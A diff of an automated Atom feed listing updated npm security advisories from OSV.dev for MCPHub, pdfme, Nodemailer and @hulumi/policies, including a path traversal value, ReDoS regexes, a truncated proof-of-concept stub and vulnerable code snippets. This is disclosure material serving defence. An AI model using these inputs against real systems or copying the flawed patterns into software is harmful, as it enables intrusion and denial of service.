@@ -3,12 +3,848 @@
   <title>OSV — new &amp; updated vulnerabilities: npm</title>
   <subtitle>Open-source vulns affecting npm packages, last 48h. Source: OSV.dev (CC-BY-4.0).</subtitle>
   <id>tag:cshintov.github.io,2026:osv-rss:npm</id>
-  <updated>2026-08-31T22:16:02Z</updated>
+  <updated>2026-09-01T03:55:43Z</updated>
   <link rel="self" href="https://cshintov.github.io/osv-rss/npm.xml"/>
   <link rel="alternate" href="https://osv.dev/"/>
   <author><name>osv-rss (data from OSV.dev)</name></author>
   <rights>Vulnerability data from OSV.dev and upstream sources (e.g. GitHub Advisory Database), licensed CC-BY-4.0.</rights>
   <generator uri="https://github.com/cshintov/osv-rss">osv-rss</generator>
+  <entry>
+    <title>[UPDATED] GHSA-p3h2-2j4p-p83g: MCPHub has Path Traversal via Malicious MCPB Manifest Name</title>
+    <id>https://osv.dev/vulnerability/GHSA-p3h2-2j4p-p83g</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-p3h2-2j4p-p83g"/>
+    <published>2026-04-22T20:50:19Z</published>
+    <updated>2026-09-01T03:55:43Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-79743"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;MCPHub has Path Traversal via Malicious MCPB Manifest Name&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-79743&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@samanhappy/mcphub&lt;/code&gt; — fixed in 0.12.13&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;**MCPB File Upload Handler** extracts a ZIP file and reads `manifest.json` from it. The `name` field in the manifest is directly concatenated into a file path (line 107) without any sanitization or path traversal character validation. An attacker can craft a malicious MCPB file where `manifest.name` is set to something like `../../../etc/malicious`, causing the file to be extracted to an arbitrary location on the file system. The `cleanupOldMcpbServer` function (line 110) also uses the unsanitized name, potentially allowing deletion of arbitrary directories.
+
+## 1. Summary
+- **Vulnerability Type**: Path Traversal (CWE-22)
+- **Sink Location**: src/controllers/mcpbController.ts:107
+- **Vulnerability Description**: The `name` field from an uploaded MCPB manifest is used directly, without sani…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/samanhappy/mcphub/security/advisories/GHSA-p3h2-2j4p-p83g"&gt;https://github.com/samanhappy/mcphub/security/advisories/GHSA-p3h2-2j4p-p83g&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/samanhappy/mcphub/commit/af5b013c09bb0add6b7ad9aaa5b875cf150d2a7c"&gt;https://github.com/samanhappy/mcphub/commit/af5b013c09bb0add6b7ad9aaa5b875cf150d2a7c&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/samanhappy/mcphub"&gt;https://github.com/samanhappy/mcphub&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-p3h2-2j4p-p83g"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-vrqm-gvq7-rrwh: PDFME Affected by Decompression Bomb in FlateDecode Stream Parsing Causes Memory Exhaustion DoS</title>
+    <id>https://osv.dev/vulnerability/GHSA-vrqm-gvq7-rrwh</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-vrqm-gvq7-rrwh"/>
+    <published>2026-03-20T20:44:52Z</published>
+    <updated>2026-09-01T03:55:43Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-82864"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;PDFME Affected by Decompression Bomb in FlateDecode Stream Parsing Causes Memory Exhaustion DoS&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-82864&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@pdfme/pdf-lib&lt;/code&gt; — fixed in 5.5.10&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+
+The `DecodeStream.ensureBuffer()` method in `@pdfme/pdf-lib` doubles its internal buffer without any upper bound on the decompressed size. A crafted PDF containing a FlateDecode stream with a high compression ratio (decompression bomb) causes unbounded memory allocation during stream decoding, leading to memory exhaustion and denial of service in both server-side (generator) and client-side (UI) contexts.
+
+## Details
+
+The vulnerability exists in the `DecodeStream` class, which is the base class for all stream decoders including `FlateStream` (DEFLATE/zlib decompression).
+
+**Unbounded buffer growth in `ensureBuffer()`** — `packages/pdf-lib/src/core/streams/DecodeStream.ts:148-160`:
+
+```typescript
+protected ensureBuffer(requested: number) {
+  const buffer = this.buffer;
+  if (req…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/pdfme/pdfme/security/advisories/GHSA-vrqm-gvq7-rrwh"&gt;https://github.com/pdfme/pdfme/security/advisories/GHSA-vrqm-gvq7-rrwh&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/pdfme/pdfme"&gt;https://github.com/pdfme/pdfme&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-vrqm-gvq7-rrwh"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-wqvq-jvpq-h66f: Nodemailer jsonTransport bypasses disableFileAccess and disableUrlAccess during message normalization</title>
+    <id>https://osv.dev/vulnerability/GHSA-wqvq-jvpq-h66f</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-wqvq-jvpq-h66f"/>
+    <published>2026-06-15T17:35:10Z</published>
+    <updated>2026-09-01T03:55:43Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-82660"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Nodemailer jsonTransport bypasses disableFileAccess and disableUrlAccess during message normalization&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-82660&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;nodemailer&lt;/code&gt; — fixed in 8.0.9&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+Nodemailer&amp;#x27;s `disableFileAccess` and `disableUrlAccess` options are intended to prevent message content and attachments from reading local files or fetching URLs. The normal MIME streaming path enforces those options in `MimeNode._getStream()`. However, `jsonTransport` serializes messages by calling `mail.normalize()`, which resolves `html`, `text`, alternatives, calendar events, and attachments through `shared.resolveContent()` before MIME generation. `shared.resolveContent()` reads local files and fetches HTTP(S) URLs directly, without receiving or checking `disableFileAccess` or `disableUrlAccess`.
+
+As a result, applications that use `jsonTransport` as a safe serializer or queue payload generator while relying on `disableFileAccess` / `disableUrlAccess` can still be made to…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer/security/advisories/GHSA-wqvq-jvpq-h66f"&gt;https://github.com/nodemailer/nodemailer/security/advisories/GHSA-wqvq-jvpq-h66f&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer"&gt;https://github.com/nodemailer/nodemailer&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-wqvq-jvpq-h66f"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-9h6g-pr28-7cqp: nodemailer ReDoS when trying to send a specially crafted email</title>
+    <id>https://osv.dev/vulnerability/GHSA-9h6g-pr28-7cqp</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-9h6g-pr28-7cqp"/>
+    <published>2024-01-31T22:42:54Z</published>
+    <updated>2026-09-01T03:55:43Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2024-58379"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;nodemailer ReDoS when trying to send a specially crafted email&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2024-58379&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;nodemailer&lt;/code&gt; — fixed in 6.9.9&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+A ReDoS vulnerability occurs when nodemailer tries to parse img files with the parameter `attachDataUrls` set, causing the stuck of event loop. 
+Another flaw was found when nodemailer tries to parse an attachments with a embedded file, causing the stuck of event loop. 
+
+### Details
+
+Regex: /^data:((?:[^;]*;)*(?:[^,]*)),(.*)$/
+
+Path: compile -&amp;gt; getAttachments -&amp;gt; _processDataUrl
+
+Regex: /(&amp;lt;img\b[^&amp;gt;]* src\s*=[\s&amp;quot;&amp;#x27;]*)(data:([^;]+);[^&amp;quot;&amp;#x27;&amp;gt;\s]+)/
+
+Path: _convertDataImages
+
+### PoC
+
+https://gist.github.com/francoatmega/890dd5053375333e40c6fdbcc8c58df6
+https://gist.github.com/francoatmega/9aab042b0b24968d7b7039818e8b2698
+
+```js
+async function exploit() {
+   const MailComposer = require(\&amp;quot;nodemailer/lib/mail-composer\&amp;quot;);
+   const MailComposerObject = new MailComposer();
+
+   // Create a ma…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer/security/advisories/GHSA-9h6g-pr28-7cqp"&gt;https://github.com/nodemailer/nodemailer/security/advisories/GHSA-9h6g-pr28-7cqp&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer/commit/dd8f5e8a4ddc99992e31df76bcff9c590035cd4a"&gt;https://github.com/nodemailer/nodemailer/commit/dd8f5e8a4ddc99992e31df76bcff9c590035cd4a&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://gist.github.com/francoatmega/890dd5053375333e40c6fdbcc8c58df6"&gt;https://gist.github.com/francoatmega/890dd5053375333e40c6fdbcc8c58df6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://gist.github.com/francoatmega/9aab042b0b24968d7b7039818e8b2698"&gt;https://gist.github.com/francoatmega/9aab042b0b24968d7b7039818e8b2698&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer"&gt;https://github.com/nodemailer/nodemailer&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-9h6g-pr28-7cqp"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-r7g4-qg5f-qqm2: Nodemailer: Improper TLS Certificate Validation in OAuth2 Token Fetch Enables Credential Interception</title>
+    <id>https://osv.dev/vulnerability/GHSA-r7g4-qg5f-qqm2</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-r7g4-qg5f-qqm2"/>
+    <published>2026-06-15T17:34:48Z</published>
+    <updated>2026-09-01T03:55:43Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-82662"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Nodemailer: Improper TLS Certificate Validation in OAuth2 Token Fetch Enables Credential Interception&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-82662&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;nodemailer&lt;/code&gt; — fixed in 8.0.8&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+Nodemailer disables TLS certificate verification in its internal HTTPS fetch client through the use of rejectUnauthorized: false inside lib/fetch/index.js.
+
+As a result, OAuth2 token requests trust invalid or self-signed HTTPS certificates and transmit sensitive OAuth credentials over connections that should fail TLS validation.
+
+An attacker in a machine-in-the-middle position can intercept OAuth2 credential exchanges and capture:
+
+- OAuth client_secret
+- refresh_token
+- access tokens
+
+The issue was verified through runtime testing using a self-signed HTTPS OAuth endpoint.
+
+### Details
+Root Cause
+
+The issue originates from the internal HTTPS fetch implementation used by Nodemailer for OAuth2 token retrieval and related outbound HTTPS requests.
+
+Inside:
+
+`lib/fetch/index.js`
+
+th…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer/security/advisories/GHSA-r7g4-qg5f-qqm2"&gt;https://github.com/nodemailer/nodemailer/security/advisories/GHSA-r7g4-qg5f-qqm2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer"&gt;https://github.com/nodemailer/nodemailer&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-r7g4-qg5f-qqm2"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-59f3-7227-wmh4: @hulumi/policies: Stack-wide evidence bypassed Cloudflare and deployment-governance guardrails</title>
+    <id>https://osv.dev/vulnerability/GHSA-59f3-7227-wmh4</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-59f3-7227-wmh4"/>
+    <published>2026-05-21T20:47:44Z</published>
+    <updated>2026-09-01T03:55:43Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-82855"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;@hulumi/policies: Stack-wide evidence bypassed Cloudflare and deployment-governance guardrails&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-82855&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@hulumi/policies&lt;/code&gt; — fixed in 1.3.2&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Impact: @hulumi/policies versions before 1.3.2 used stack-wide evidence shortcuts in several Cloudflare and deployment-governance validators. Unrelated compliant-looking evidence could suppress violations for different zones, hostnames, origins, or repositories in the same stack.
+
+Patched in 1.3.2: validators now correlate evidence to the specific protected resource and include regression coverage for unrelated-evidence bypasses.
+
+Remediation: upgrade @hulumi/policies to 1.3.2 or later.&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-59f3-7227-wmh4"&gt;https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-59f3-7227-wmh4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/kerberosmansour/hulumi"&gt;https://github.com/kerberosmansour/hulumi&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-59f3-7227-wmh4"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-268h-hp4c-crq3: Nodemailer: CRLF injection in Nodemailer List-* header comments allows arbitrary message header injection</title>
+    <id>https://osv.dev/vulnerability/GHSA-268h-hp4c-crq3</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-268h-hp4c-crq3"/>
+    <published>2026-06-15T17:36:06Z</published>
+    <updated>2026-09-01T03:55:42Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-82661"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Nodemailer: CRLF injection in Nodemailer List-* header comments allows arbitrary message header injection&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-82661&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;nodemailer&lt;/code&gt; — fixed in 8.0.9&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+Nodemailer constructs `List-*` headers from the caller-provided `list` message option using internally prepared header values. The `list.*.comment` field is inserted into those prepared values without removing CR (`\r`) or LF (`\n`) characters. Because prepared headers bypass the normal header-value sanitizer and are passed to `mimeFuncs.foldLines()`, a CRLF sequence in a list comment is emitted as an actual header boundary in the generated RFC822 message.
+
+An application that lets a lower-privileged or unauthenticated user influence `list.help.comment`, `list.unsubscribe.comment`, `list.subscribe.comment`, `list.post.comment`, `list.owner.comment`, `list.archive.comment`, or `list.id.comment` can therefore be made to generate messages containing attacker-chosen additional hea…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer/security/advisories/GHSA-268h-hp4c-crq3"&gt;https://github.com/nodemailer/nodemailer/security/advisories/GHSA-268h-hp4c-crq3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer"&gt;https://github.com/nodemailer/nodemailer&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-268h-hp4c-crq3"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-xgx4-2wgv-4jhm: PDFME  has XSS via Unsanitized i18n Label Injection into innerHTML in multiVariableText propPanel</title>
+    <id>https://osv.dev/vulnerability/GHSA-xgx4-2wgv-4jhm</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-xgx4-2wgv-4jhm"/>
+    <published>2026-03-20T20:45:08Z</published>
+    <updated>2026-09-01T03:55:42Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-82865"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;PDFME  has XSS via Unsanitized i18n Label Injection into innerHTML in multiVariableText propPanel&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-82865&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@pdfme/schemas&lt;/code&gt; — fixed in 5.5.10&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+
+The multiVariableText property panel in `@pdfme/schemas` constructs HTML via string concatenation and assigns it to `innerHTML` using unsanitized i18n label values. An attacker who can control label overrides passed through `options.labels` can inject arbitrary JavaScript that executes in the context of any user who opens the Designer and selects a multiVariableText field with no `{variables}` in its text.
+
+## Details
+
+When a user selects a multiVariableText schema field that contains no `{variable}` placeholders, the property panel renders instructional text by concatenating i18n-translated strings directly into `innerHTML`.
+
+**Vulnerable sink** — `packages/schemas/src/multiVariableText/propPanel.ts:65-71`:
+
+```typescript
+// Use safe string concatenation for innerHTML
+const ty…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/pdfme/pdfme/security/advisories/GHSA-xgx4-2wgv-4jhm"&gt;https://github.com/pdfme/pdfme/security/advisories/GHSA-xgx4-2wgv-4jhm&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/pdfme/pdfme"&gt;https://github.com/pdfme/pdfme&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-xgx4-2wgv-4jhm"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-qq9g-96v4-m3cj: Cross-Site Scripting (XSS) via Select Schema Option Value Injection in @pdfme/schemas</title>
+    <id>https://osv.dev/vulnerability/GHSA-qq9g-96v4-m3cj</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-qq9g-96v4-m3cj"/>
+    <published>2026-03-18T16:10:16Z</published>
+    <updated>2026-09-01T03:55:42Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-82867"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Cross-Site Scripting (XSS) via Select Schema Option Value Injection in @pdfme/schemas&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-82867&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@pdfme/schemas&lt;/code&gt; — fixed in 5.5.9&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+
+The Select schema plugin in `@pdfme/schemas` constructs HTML from template-defined option values using unsanitized string interpolation and sets it via `innerHTML`, enabling arbitrary JavaScript execution.
+
+## Details
+
+In `packages/schemas/src/select/index.ts`, lines 159-164, the Select schema&amp;#x27;s `ui` renderer builds `&amp;lt;option&amp;gt;` elements by directly interpolating option values from the template into an HTML string:
+
+```typescript
+const options = Array.isArray(schema.options) ? schema.options : [];
+selectElement.innerHTML = options
+  .map(
+    (option) =&amp;gt;
+      `&amp;lt;option value=&amp;quot;${option}&amp;quot; ${option === value ? &amp;#x27;selected&amp;#x27; : &amp;#x27;&amp;#x27;}&amp;gt;${option}&amp;lt;/option&amp;gt;`,
+  )
+  .join(&amp;#x27;&amp;#x27;);
+```
+
+The `option` values come from `schema.options`, which is an array of strings defined in the template JSON. These va…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/pdfme/pdfme/security/advisories/GHSA-qq9g-96v4-m3cj"&gt;https://github.com/pdfme/pdfme/security/advisories/GHSA-qq9g-96v4-m3cj&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/pdfme/pdfme"&gt;https://github.com/pdfme/pdfme&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-qq9g-96v4-m3cj"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-q2f7-m237-v562: @hulumi/policies: GitHub OIDC trust policy bypass via AWS set-qualified condition operators</title>
+    <id>https://osv.dev/vulnerability/GHSA-q2f7-m237-v562</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-q2f7-m237-v562"/>
+    <published>2026-05-21T20:45:14Z</published>
+    <updated>2026-09-01T03:55:42Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-82856"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;@hulumi/policies: GitHub OIDC trust policy bypass via AWS set-qualified condition operators&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-82856&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@hulumi/policies&lt;/code&gt; — fixed in 1.3.2&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Impact: @hulumi/policies versions before 1.3.2 only checked exact AWS IAM StringLike/StringEquals condition operator keys in G_OIDC_1. Set-qualified operators such as ForAnyValue:StringLike could hide wildcard GitHub Actions OIDC sub conditions from the mandatory guardrail.
+
+Patched in 1.3.2: the AWS trust-policy inspector now evaluates set-qualified string operators and rejects unsafe GitHub OIDC sub conditions.
+
+Remediation: upgrade @hulumi/policies to 1.3.2 or later.&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-q2f7-m237-v562"&gt;https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-q2f7-m237-v562&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/kerberosmansour/hulumi"&gt;https://github.com/kerberosmansour/hulumi&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-q2f7-m237-v562"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-4xrh-5m3m-328w: @hulumi/policies: CIS 1.16 admin policy bypass for inline and attached IAM policies</title>
+    <id>https://osv.dev/vulnerability/GHSA-4xrh-5m3m-328w</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-4xrh-5m3m-328w"/>
+    <published>2026-05-21T20:44:12Z</published>
+    <updated>2026-09-01T03:55:42Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-82860"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;@hulumi/policies: CIS 1.16 admin policy bypass for inline and attached IAM policies&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-82860&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@hulumi/policies&lt;/code&gt; — fixed in 1.3.2&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Impact: @hulumi/policies versions before 1.3.2 did not fully inspect inline and attached IAM policy evidence for the administrator-policy guardrail, so some admin-equivalent policy paths could pass policy evaluation.
+
+Patched in 1.3.2: the validator inspects the affected policy shapes and includes regression tests.
+
+Remediation: upgrade @hulumi/policies to 1.3.2 or later.&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-4xrh-5m3m-328w"&gt;https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-4xrh-5m3m-328w&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/kerberosmansour/hulumi"&gt;https://github.com/kerberosmansour/hulumi&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-4xrh-5m3m-328w"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-pgx6-7jcq-2qff: PDFME has SSRF via Unvalidated URL Fetch in `getB64BasePdf` When `basePdf` Is Attacker-Controlled</title>
+    <id>https://osv.dev/vulnerability/GHSA-pgx6-7jcq-2qff</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-pgx6-7jcq-2qff"/>
+    <published>2026-03-20T20:45:17Z</published>
+    <updated>2026-09-01T03:55:42Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-82866"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;PDFME has SSRF via Unvalidated URL Fetch in `getB64BasePdf` When `basePdf` Is Attacker-Controlled&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-82866&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@pdfme/common&lt;/code&gt; — fixed in 5.5.10&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+
+The `getB64BasePdf` function in `@pdfme/common` fetches arbitrary URLs via `fetch()` without any validation when `basePdf` is a non-data-URI string and `window` is defined. An attacker who can control the `basePdf` field of a template (e.g., through a web application that accepts user-supplied templates) can force the server or client to make requests to arbitrary internal or external endpoints, enabling Server-Side Request Forgery (SSRF) in SSR contexts or blind request forgery in browser contexts.
+
+## Details
+
+The vulnerability exists in `packages/common/src/helper.ts:130-141`. When `getB64BasePdf` receives a string that does not start with `data:application/pdf;`, and `window` is defined, it passes the string directly to `fetch()`:
+
+```typescript
